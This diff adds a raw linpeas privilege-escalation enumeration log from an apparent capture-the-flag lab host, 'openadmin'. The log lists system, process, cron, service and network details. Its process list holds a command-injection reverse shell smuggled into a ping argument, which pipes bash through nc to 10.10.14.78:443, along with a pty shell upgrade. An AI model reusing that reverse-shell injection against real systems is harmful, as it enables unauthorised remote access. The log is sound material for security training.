@@ -1,0 +1,2448 @@
+www-data@openadmin /tmp $ ./linpeas.sh -a
+ Starting linpeas. Building blacklists...
+
+                     ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+             ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄▄
+      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄
+  ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄
+  ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
+  ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
+  ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
+  ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
+  ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
+  ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
+  ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
+  ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
+  ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
+  ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
+   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
+  ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+   ▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄
+        ▄▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄ 
+             ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+    linpeas v2.7.9 by carlospolop
+
+ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.
+
+Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
+ LEGEND:
+  RED/YELLOW: 99% a PE vector
+  RED: You must take a look at it
+  LightCyan: Users with console
+  Blue: Users without console & mounted devs
+  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
+  LightMangeta: Your username
+
+
+====================================( Basic information )=====================================
+OS: Linux version 4.15.0-70-generic (buildd@lgw01-amd64-055) (gcc version 7.4.0 (Ubuntu 7.4.0-1ubuntu1~18.04.1)) #79-Ubuntu SMP Tue Nov 12 10:36:11 UTC 2019
+User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+Hostname: openadmin
+Writable folder: /dev/shm
+[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
+[+] /bin/nc is available for network discover & port scanning (linpeas can discover hosts and scan ports, learn more with -h)
+
+
+Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE
+====================================( System Information )====================================
+[+] Operative system
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits
+Linux version 4.15.0-70-generic (buildd@lgw01-amd64-055) (gcc version 7.4.0 (Ubuntu 7.4.0-1ubuntu1~18.04.1)) #79-Ubuntu SMP Tue Nov 12 10:36:11 UTC 2019
+Distributor ID:	Ubuntu
+Description:	Ubuntu 18.04.3 LTS
+Release:	18.04
+Codename:	bionic
+
+[+] Sudo version
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version
+Sudo version 1.8.21p2
+
+[+] PATH
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+[+] Date
+Fri Sep 18 16:01:15 UTC 2020
+
+[+] System stats
+Filesystem      Size  Used Avail Use% Mounted on
+/dev/sda2       7.9G  4.2G  3.3G  57% /
+udev            967M     0  967M   0% /dev
+tmpfs           997M     0  997M   0% /dev/shm
+tmpfs           200M  1.1M  199M   1% /run
+tmpfs           5.0M     0  5.0M   0% /run/lock
+tmpfs           997M     0  997M   0% /sys/fs/cgroup
+/dev/loop0       90M   90M     0 100% /snap/core/8039
+/dev/loop1       89M   89M     0 100% /snap/core/7270
+              total        used        free      shared  buff/cache   available
+Mem:        2041596      322012      394532        6020     1325052     1526368
+Swap:       1579004           0     1579004
+
+[+] CPU info
+Architecture:        x86_64
+CPU op-mode(s):      32-bit, 64-bit
+Byte Order:          Little Endian
+CPU(s):              2
+On-line CPU(s) list: 0,1
+Thread(s) per core:  1
+Core(s) per socket:  1
+Socket(s):           2
+NUMA node(s):        1
+Vendor ID:           AuthenticAMD
+CPU family:          23
+Model:               49
+Model name:          AMD EPYC 7302P 16-Core Processor
+Stepping:            0
+CPU MHz:             2994.375
+BogoMIPS:            5988.75
+Hypervisor vendor:   VMware
+Virtualization type: full
+L1d cache:           32K
+L1i cache:           32K
+L2 cache:            512K
+L3 cache:            131072K
+NUMA node0 CPU(s):   0,1
+Flags:               fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx mmxext fxsr_opt pdpe1gb rdtscp lm constant_tsc rep_good nopl tsc_reliable nonstop_tsc cpuid extd_apicid pni pclmulqdq ssse3 fma cx16 sse4_1 sse4_2 x2apic movbe popcnt aes xsave avx f16c rdrand hypervisor lahf_lm extapic cr8_legacy abm sse4a misalignsse 3dnowprefetch osvw ssbd ibpb vmmcall fsgsbase bmi1 avx2 smep bmi2 rdseed adx smap xsaveopt arat overflow_recov succor
+
+[+] Environment
+[i] Any private information inside environment variables?
+HISTFILESIZE=0
+SHLVL=2
+PS1=\[\033[01;32m\]\u@\h\[\033[01;34m\] \w \$\[\033[00m\] 
+APACHE_RUN_DIR=/var/run/apache2
+APACHE_PID_FILE=/var/run/apache2/apache2.pid
+JOURNAL_STREAM=9:20509
+_=./linpeas.sh
+TERM=xterm
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+INVOCATION_ID=945ab64fd7924c1ba238dbaae8c90e9e
+APACHE_LOCK_DIR=/var/lock/apache2
+LANG=C
+HISTSIZE=0
+SHELL=bash
+APACHE_RUN_GROUP=www-data
+APACHE_RUN_USER=www-data
+APACHE_LOG_DIR=/var/log/apache2
+HISTFILE=/dev/null
+LS_OPTIONS=--color=auto
+
+[+] Searching Signature verification failed in dmseg
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#dmesg-signature-verification-failed
+ Not Found
+
+[+] AppArmor enabled? .............. You do not have enough privilege to read the profile set.
+apparmor module is loaded.
+[+] grsecurity present? ............ grsecurity Not Found
+[+] PaX bins present? .............. PaX Not Found
+[+] Execshield enabled? ............ Execshield Not Found
+[+] SELinux enabled? ............... sestatus Not Found
+[+] Is ASLR enabled? ............... Yes
+[+] Printer? ....................... lpstat Not Found
+[+] Is this a container? ........... No
+[+] Any running containers? ........ No
+
+
+=========================================( Devices )==========================================
+[+] Any sd*/disk* disk in /dev? (limit 20)
+disk
+sda
+sda1
+sda2
+
+[+] Unmounted file-system?
+[i] Check if you can mount umounted devices
+UUID=faf60c54-5ca1-43ac-a61b-b1ded42569f2 / ext4 defaults 0 0
+/swap.img	none	swap	sw	0	0
+
+
+====================================( Available Software )====================================
+[+] Useful software
+/bin/nc
+/bin/netcat
+/usr/bin/wget
+/usr/bin/curl
+/bin/ping
+/usr/bin/base64
+/usr/bin/python3
+/usr/bin/python3.6
+/usr/bin/perl
+/usr/bin/php
+/usr/bin/sudo
+/usr/bin/lxc
+
+[+] Installed Compiler
+/snap/core/7270/usr/share/gcc-5
+/snap/core/8039/usr/share/gcc-5
+/usr/share/gcc-8
+
+
+================================( Processes, Cron, Services, Timers & Sockets )================================
+[+] Cleaned processes
+[i] Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
+daemon[0m     616  0.0  0.1  28332  2424 ?        Ss   14:58   0:00 /usr/sbin/atd -f
+message+   638  0.0  0.2  50060  4668 ?        Ss   14:58   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+mysql      993  0.0  9.4 1621184 192428 ?      Sl   14:59   0:02 /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid
+root         1  0.0  0.4 159592  8720 ?        Ss   14:58   0:02 /sbin/init auto automatic-ubiquity noprompt
+root       389  0.0  0.7  94864 14964 ?        S<s  14:58   0:00 /lib/systemd/systemd-journald
+root       402  0.0  0.0  97708  1756 ?        Ss   14:58   0:00 /sbin/lvmetad -f
+root       413  0.0  0.2  46616  5500 ?        Ss   14:58   0:01 /lib/systemd/systemd-udevd
+root       453  0.0  0.4  88224  9680 ?        Ss   14:58   0:00 /usr/bin/VGAuthService
+root       614  0.0  0.5 191712 11164 ?        Ssl  14:58   0:02 /usr/bin/vmtoolsd
+root       617  0.0  0.3 286356  6996 ?        Ssl  14:58   0:00 /usr/lib/accountsservice/accounts-daemon[0m
+root       626  0.0  0.0 309400  1836 ?        Ssl  14:58   0:00 /usr/bin/lxcfs /var/lib/lxcfs/
+root       635  0.0  0.0 110544  1952 ?        Ssl  14:58   0:00 /usr/sbin/irqbalance --foreground
+root       637  0.0  0.1  30028  3232 ?        Ss   14:58   0:00 /usr/sbin/cron -f
+root       650  0.0  0.2  62136  5636 ?        Ss   14:58   0:00 /lib/systemd/systemd-logind
+root       662  0.0  1.2 853600 24688 ?        Ssl  14:58   0:01 /usr/lib/snapd/snapd
+root       663  0.0  0.8 169096 17060 ?        Ssl  14:58   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
+root       675  0.0  0.3 288880  6592 ?        Ssl  14:58   0:00 /usr/lib/policykit-1/polkitd --no-debug
+root       867  0.0  0.9 185940 20268 ?        Ssl  14:59   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
+root       922  0.0  0.3  72296  6560 ?        Ss   14:59   0:00 /usr/sbin/sshd -D
+root       945  0.0  0.0  14888  1956 tty1     Ss+  14:59   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
+root       996  0.0  0.9 371272 20056 ?        Ss   14:59   0:00 /usr/sbin/apache2 -k start
+syslog     620  0.0  0.2 263036  4748 ?        Ssl  14:58   0:00 /usr/sbin/rsyslogd -n
+systemd+   454  0.0  0.1 141928  3352 ?        Ssl  14:58   0:00 /lib/systemd/systemd-timesyncd
+systemd+   468  0.0  0.2  71848  5396 ?        Ss   14:58   0:00 /lib/systemd/systemd-networkd
+systemd+   515  0.0  0.2  70628  5336 ?        Ss   14:58   0:00 /lib/systemd/systemd-resolved
+www-data  1436  0.0  0.5 375676 11200 ?        S    15:07   0:00 /usr/sbin/apache2 -k start
+www-data  2415  0.0  0.5 375676 11204 ?        S    15:12   0:00 /usr/sbin/apache2 -k start
+www-data  2437  0.0  0.5 375676 11204 ?        S    15:12   0:00 /usr/sbin/apache2 -k start
+www-data  2457  0.0  0.5 375676 11204 ?        S    15:12   0:00 /usr/sbin/apache2 -k start
+www-data  2526  0.0  0.5 375676 11204 ?        S    15:13   0:00 /usr/sbin/apache2 -k start
+www-data  2579  0.0  0.5 375676 11204 ?        S    15:13   0:00 /usr/sbin/apache2 -k start
+www-data  2585  0.0  0.5 375676 11204 ?        S    15:13   0:00 /usr/sbin/apache2 -k start
+www-data  2599  0.0  0.5 375676 11204 ?        S    15:13   0:00 /usr/sbin/apache2 -k start
+www-data  2613  0.0  0.5 375676 11204 ?        S    15:13   0:00 /usr/sbin/apache2 -k start
+www-data  2623  0.0  0.5 375676 11204 ?        S    15:13   0:00 /usr/sbin/apache2 -k start
+www-data 21871  0.0  0.7 376232 14408 ?        S    15:56   0:00 /usr/sbin/apache2 -k start
+www-data 21874  0.0  0.0   4628   876 ?        S    15:56   0:00 sh -c ping -n -w 3 -c 3 ;echo "BEGIN";rm /tmp/shell;mkfifo /tmp/shell;cat /tmp/shell|/bin/bash -i 2>&1|nc 10.10.14.78 443 >/tmp/shell;echo "END"
+www-data 21878  0.0  0.0   4672   788 ?        S    15:56   0:00 cat /tmp/shell
+www-data 21879  0.0  0.1  18508  3448 ?        S    15:56   0:00 /bin/bash -i
+www-data 21880  0.0  0.1  15716  2164 ?        S    15:56   0:00 nc 10.10.14.78 443
+www-data 21900  0.0  0.4  37424  9400 ?        S    15:58   0:00 python3 -c import pty; pty.spawn("/bin/bash")
+www-data 21901  0.0  0.1  18508  3432 pts/0    Ss   15:58   0:00 /bin/bash
+www-data 21921  0.4  0.1   5116  2236 pts/0    S+   16:01   0:00 /bin/sh ./linpeas.sh -a
+www-data 22517  0.0  0.1  36700  3128 pts/0    R+   16:01   0:00 ps aux
+www-data 22519  0.0  0.0  15116   968 pts/0    S+   16:01   0:00 sort
+
+[+] Binary processes permissions
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
+-rwxr-xr-x 1 root root  1113504 Jun  6  2019 /bin/bash
+lrwxrwxrwx 1 root root        4 Aug  5  2019 /bin/sh -> dash
+-rwxr-xr-x 1 root root   129096 Sep 30  2019 /lib/systemd/systemd-journald
+-rwxr-xr-x 1 root root   219272 Sep 30  2019 /lib/systemd/systemd-logind
+-rwxr-xr-x 1 root root  1625168 Sep 30  2019 /lib/systemd/systemd-networkd
+-rwxr-xr-x 1 root root   378944 Sep 30  2019 /lib/systemd/systemd-resolved
+-rwxr-xr-x 1 root root    38976 Sep 30  2019 /lib/systemd/systemd-timesyncd
+-rwxr-xr-x 1 root root   584136 Sep 30  2019 /lib/systemd/systemd-udevd
+-rwxr-xr-x 1 root root    56552 Aug 22  2019 /sbin/agetty
+lrwxrwxrwx 1 root root       20 Sep 30  2019 /sbin/init -> /lib/systemd/systemd
+-rwxr-xr-x 1 root root    84104 Jun  4  2019 /sbin/lvmetad
+-rwxr-xr-x 1 root root   125144 May 14  2019 /usr/bin/VGAuthService
+-rwxr-xr-x 1 root root   236584 Jun 10  2019 /usr/bin/dbus-daemon[0m
+-rwxr-xr-x 1 root root    18504 Nov 23  2018 /usr/bin/lxcfs
+lrwxrwxrwx 1 root root        9 Oct 25  2018 /usr/bin/python3 -> python3.6
+-rwxr-xr-x 1 root root    51456 May 14  2019 /usr/bin/vmtoolsd
+-rwxr-xr-x 1 root root   182552 Dec 18  2017 /usr/lib/accountsservice/accounts-daemon[0m
+-rwxr-xr-x 1 root root    14552 Mar 27  2019 /usr/lib/policykit-1/polkitd
+-rwxr-xr-x 1 root root 18356904 Jul 12  2019 /usr/lib/snapd/snapd
+-rwxr-xr-x 1 root root   671392 Sep 16  2019 /usr/sbin/apache2
+-rwxr-xr-x 1 root root    26632 Feb 20  2018 /usr/sbin/atd
+-rwxr-xr-x 1 root root    47416 Nov 16  2017 /usr/sbin/cron
+-rwxr-xr-x 1 root root    64184 Jan  9  2019 /usr/sbin/irqbalance
+-rwxr-xr-x 1 root root 24605800 Nov 15  2019 /usr/sbin/mysqld
+-rwxr-xr-x 1 root root   680488 Apr 24  2018 /usr/sbin/rsyslogd
+-rwxr-xr-x 1 root root   786856 Mar  4  2019 /usr/sbin/sshd
+
+[+] Processes with credentials in memory (root req)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#credentials-from-process-memory
+gdm-password Not Found
+gnome-keyring-daemon Not Found
+lightdm Not Found
+vsftpd Not Found
+apache2 process found (dump creds from memory as root)
+sshd Not Found
+
+[+] Different processes executed during 1 min (interesting is low number of repetitions)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#frequent-cron-jobs
+
+[+] Cron jobs
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-cron-jobs
+-rw-r--r-- 1 root root  722 Nov 16  2017 /etc/crontab
+
+/etc/cron.d:
+total 24
+drwxr-xr-x  2 root root 4096 Nov 21  2019 .
+drwxr-xr-x 93 root root 4096 Jan  2  2020 ..
+-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
+-rw-r--r--  1 root root  589 Jan 30  2019 mdadm
+-rw-r--r--  1 root root  712 Jan 17  2018 php
+-rw-r--r--  1 root root  191 Aug  5  2019 popularity-contest
+
+/etc/cron.daily:
+total 64
+drwxr-xr-x  2 root root 4096 Nov 21  2019 .
+drwxr-xr-x 93 root root 4096 Jan  2  2020 ..
+-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
+-rwxr-xr-x  1 root root  539 Jul 16  2019 apache2
+-rwxr-xr-x  1 root root  376 Nov 20  2017 apport
+-rwxr-xr-x  1 root root 1478 Apr 20  2018 apt-compat
+-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils
+-rwxr-xr-x  1 root root 1176 Nov  2  2017 dpkg
+-rwxr-xr-x  1 root root  372 Aug 21  2017 logrotate
+-rwxr-xr-x  1 root root 1065 Apr  7  2018 man-db
+-rwxr-xr-x  1 root root  539 Jan 30  2019 mdadm
+-rwxr-xr-x  1 root root  538 Mar  1  2018 mlocate
+-rwxr-xr-x  1 root root  249 Jan 25  2018 passwd
+-rwxr-xr-x  1 root root 3477 Feb 21  2018 popularity-contest
+-rwxr-xr-x  1 root root  246 Mar 21  2018 ubuntu-advantage-tools
+-rwxr-xr-x  1 root root  214 Nov 12  2018 update-notifier-common
+
+/etc/cron.hourly:
+total 12
+drwxr-xr-x  2 root root 4096 Aug  5  2019 .
+drwxr-xr-x 93 root root 4096 Jan  2  2020 ..
+-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
+
+/etc/cron.monthly:
+total 12
+drwxr-xr-x  2 root root 4096 Aug  5  2019 .
+drwxr-xr-x 93 root root 4096 Jan  2  2020 ..
+-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
+
+/etc/cron.weekly:
+total 20
+drwxr-xr-x  2 root root 4096 Aug  5  2019 .
+drwxr-xr-x 93 root root 4096 Jan  2  2020 ..
+-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
+-rwxr-xr-x  1 root root  723 Apr  7  2018 man-db
+-rwxr-xr-x  1 root root  211 Nov 12  2018 update-notifier-common
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+
+[+] Services
+[i] Search for outdated versions
+ [ - ]  acpid
+ [ + ]  apache-htcacheclean
+ [ + ]  apache2
+ [ + ]  apparmor
+ [ + ]  apport
+ [ + ]  atd
+ [ - ]  console-setup.sh
+ [ + ]  cron
+ [ - ]  cryptdisks
+ [ - ]  cryptdisks-early
+ [ + ]  dbus
+ [ + ]  ebtables
+ [ + ]  grub-common
+ [ - ]  hwclock.sh
+ [ + ]  irqbalance
+ [ + ]  iscsid
+ [ - ]  keyboard-setup.sh
+ [ + ]  kmod
+ [ - ]  lvm2
+ [ + ]  lvm2-lvmetad
+ [ + ]  lvm2-lvmpolld
+ [ + ]  lxcfs
+ [ - ]  lxd
+ [ - ]  mdadm
+ [ - ]  mdadm-waitidle
+ [ + ]  mysql
+ [ + ]  networking
+ [ - ]  open-iscsi
+ [ + ]  open-vm-tools
+ [ - ]  plymouth
+ [ - ]  plymouth-log
+ [ + ]  procps
+ [ - ]  rsync
+ [ + ]  rsyslog
+ [ - ]  screen-cleanup
+ [ + ]  ssh
+ [ + ]  udev
+ [ + ]  ufw
+ [ + ]  unattended-upgrades
+ [ - ]  uuidd
+
+[+] Systemd PATH
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#systemd-path-relative-paths
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+[+] Analyzing .service files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#services
+/etc/systemd/system/multi-user.target.wants/networking.service is executing some relative path
+/etc/systemd/system/network-online.target.wants/networking.service is executing some relative path
+/lib/systemd/system/networking.service is executing some relative path
+/snap/core/7270/etc/systemd/system/multi-user.target.wants/networking.service is executing some relative path
+/snap/core/7270/etc/systemd/system/network-online.target.wants/networking.service is executing some relative path
+/snap/core/7270/lib/systemd/system/emergency.service is executing some relative path
+/snap/core/7270/lib/systemd/system/networking.service is executing some relative path
+/snap/core/7270/lib/systemd/system/rescue.service is executing some relative path
+/snap/core/8039/etc/systemd/system/multi-user.target.wants/networking.service is executing some relative path
+/snap/core/8039/etc/systemd/system/network-online.target.wants/networking.service is executing some relative path
+/snap/core/8039/lib/systemd/system/emergency.service is executing some relative path
+/snap/core/8039/lib/systemd/system/networking.service is executing some relative path
+/snap/core/8039/lib/systemd/system/rescue.service is executing some relative path
+You can't write on systemd PATH
+
+[+] System timers
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers
+NEXT                         LEFT          LAST                         PASSED      UNIT                         ACTIVATES
+Fri 2020-09-18 16:09:00 UTC  6min left     Fri 2020-09-18 15:39:04 UTC  23min ago   phpsessionclean.timer        phpsessionclean.service
+Fri 2020-09-18 21:25:34 UTC  5h 22min left Fri 2020-09-18 14:58:59 UTC  1h 3min ago motd-news.timer              motd-news.service
+Sat 2020-09-19 03:47:27 UTC  11h left      Fri 2020-09-18 14:58:59 UTC  1h 3min ago apt-daily.timer              apt-daily.service
+Sat 2020-09-19 06:00:51 UTC  13h left      Fri 2020-09-18 14:58:59 UTC  1h 3min ago apt-daily-upgrade.timer      apt-daily-upgrade.service
+Sat 2020-09-19 15:14:04 UTC  23h left      Fri 2020-09-18 15:14:04 UTC  48min ago   systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
+Mon 2020-09-21 00:00:00 UTC  2 days left   Fri 2020-09-18 14:58:59 UTC  1h 3min ago fstrim.timer                 fstrim.service
+n/a                          n/a           n/a                          n/a         snapd.snap-repair.timer      snapd.snap-repair.service
+n/a                          n/a           n/a                          n/a         ureadahead-stop.timer        ureadahead-stop.service
+
+[+] Analyzing .timer files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers
+
+[+] Analyzing .socket files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets
+
+[+] HTTP sockets
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets
+Socket /run/snapd.socket owned by root uses HTTP. Response to /index:
+{"type":"sync","status-code":200,"status":"OK","result":["TBD"]}
+Socket /run/snapd-snap.socket owned by root uses HTTP. Response to /index:
+{"type":"error","status-code":401,"status":"Unauthorized","result":{"message":"access denied","kind":"login-required"}}
+
+[+] D-Bus config files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus
+Possible weak user policy found on /etc/dbus-1/system.d/dnsmasq.conf (        <policy user="dnsmasq">)
+Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.thermald.conf (        <policy group="power">)
+
+[+] D-Bus Service Objects list
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus
+NAME                                 PID PROCESS         USER             CONNECTION    UNIT                      SESSION    DESCRIPTION        
+:1.0                                 468 systemd-network systemd-network  :1.0          systemd-networkd.service  -          -                  
+:1.1                                 515 systemd-resolve systemd-resolve  :1.1          systemd-resolved.service  -          -                  
+:1.144                              9065 busctl          www-data         :1.144        apache2.service           -          -                  
+:1.2                                   1 systemd         root             :1.2          init.scope                -          -                  
+:1.4                                 617 accounts-daemon root             :1.4          accounts-daemon.service   -          -                  
+:1.5                                 650 systemd-logind  root             :1.5          systemd-logind.service    -          -                  
+:1.6                                 675 polkitd         root             :1.6          polkit.service            -          -                  
+:1.7                                 663 networkd-dispat root             :1.7          networkd-dispatcher.se…ce -          -                  
+:1.8                                 867 unattended-upgr root             :1.8          unattended-upgrades.se…ce -          -                  
+com.ubuntu.LanguageSelector            - -               -                (activatable) -                         -         
+com.ubuntu.SoftwareProperties          - -               -                (activatable) -                         -         
+org.freedesktop.Accounts             617 accounts-daemon root             :1.4          accounts-daemon.service   -          -                  
+org.freedesktop.DBus                   1 systemd         root             -             init.scope                -          -                  
+org.freedesktop.PolicyKit1           675 polkitd         root             :1.6          polkit.service            -          -                  
+org.freedesktop.hostname1              - -               -                (activatable) -                         -         
+org.freedesktop.locale1                - -               -                (activatable) -                         -         
+org.freedesktop.login1               650 systemd-logind  root             :1.5          systemd-logind.service    -          -                  
+org.freedesktop.network1             468 systemd-network systemd-network  :1.0          systemd-networkd.service  -          -                  
+org.freedesktop.resolve1             515 systemd-resolve systemd-resolve  :1.1          systemd-resolved.service  -          -                  
+org.freedesktop.systemd1               1 systemd         root             :1.2          init.scope                -          -                  
+org.freedesktop.thermald               - -               -                (activatable) -                         -         
+org.freedesktop.timedate1              - -               -                (activatable) -                         -         
+
+
+===================================( Network Information )====================================
+[+] Hostname, hosts and DNS
+openadmin
+127.0.0.1 localhost
+127.0.1.1 openadmin
+
+::1     ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+
+91.189.88.174	archive.ubuntu.com
+
+nameserver 127.0.0.53
+options edns0
+
+[+] Content of /etc/inetd.conf & /etc/xinetd.conf
+/etc/inetd.conf Not Found
+
+[+] Interfaces
+# symbolic names for networks, see networks(5) for more information
+link-local 169.254.0.0
+ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.10.10.171  netmask 255.255.255.0  broadcast 10.10.10.255
+        inet6 dead:beef::250:56ff:feb9:b88e  prefixlen 64  scopeid 0x0<global>
+        inet6 fe80::250:56ff:feb9:b88e  prefixlen 64  scopeid 0x20<link>
+        ether 00:50:56:b9:b8:8e  txqueuelen 1000  (Ethernet)
+        RX packets 2165382  bytes 555016622 (555.0 MB)
+        RX errors 0  dropped 44  overruns 0  frame 0
+        TX packets 2054470  bytes 408867038 (408.8 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 11684  bytes 843582 (843.5 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 11684  bytes 843582 (843.5 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+
+[+] Networks and neighbours
+Kernel IP routing table
+Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
+default         _gateway        0.0.0.0         UG    0      0        0 ens160
+10.10.10.0      0.0.0.0         255.255.255.0   U     0      0        0 ens160
+Address                  HWtype  HWaddress           Flags Mask            Iface
+_gateway                 ether   00:50:56:b9:75:a0   C                     ens160
+
+[+] Iptables rules
+iptables rules Not Found
+
+[+] Active Ports
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.1:52846         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+tcp        0    138 10.10.10.171:51534      10.10.14.78:443         ESTABLISHED 21880/nc            
+tcp6       0      0 :::80                   :::*                    LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+tcp6       1      0 10.10.10.171:80         10.10.14.78:43618       CLOSE_WAIT  -                   
+udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
+
+[+] Can I sniff with tcpdump?
+No
+
+
+====================================( Users Information )=====================================
+[+] My user
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#users
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+[+] Do I have PGP keys?
+gpg Not Found
+
+[+] Clipboard or highlighted text?
+xsel and xclip Not Found
+
+[+] Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
+
+[+] Checking sudo tokens
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
